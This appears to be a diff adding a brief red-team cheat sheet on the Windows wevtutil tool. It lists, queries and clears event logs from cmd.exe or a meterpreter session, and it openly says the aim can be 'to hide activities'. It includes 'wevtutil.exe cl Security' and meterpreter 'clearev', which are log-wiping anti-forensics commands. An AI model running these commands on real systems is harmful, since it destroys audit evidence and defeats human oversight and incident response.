@@ -1,0 +1,44 @@
+#  The purpose of this can be twofold: to inspect system logs or to remove them to hide activities
+
+### About wevtutil:
+“Enables you to retrieve information about event logs and publishers. You can also use this
+command to install and uninstall event manifests, to run queries, and to export, archive, and
+clear logs.”
+
+# Once on a windows host and with sufficient permissions
+
+## from meterpreter 
+
+meterpreter> execute -f cmd.exe -H -c -i 
+
+C:\> wevtutil.exe el
+
+## from CMD.exe 
+
+C:\> wevtutil.exe el   
+
+# this will dump ALL windows log types
+
+# dump only security
+
+C:\> wevtutil.exe gli Security
+
+# this will show you some info about the total number of security logs
+
+# view the first 3 logs
+
+C:\> wevtutil.exe qe Security /c:3 /rd:true /f:text
+
+# Cleaning all the Security logs
+
+C:\> wevtutil.exe cl Security
+
+# Verifying that all Security logs are cleaned or not
+
+C:\> wevtutil.exe qe Security /c:10 /rd:true /f:text
+
+## Similarly you can use the follwing from meterpreter
+
+meterpreter>  clearev
+
+
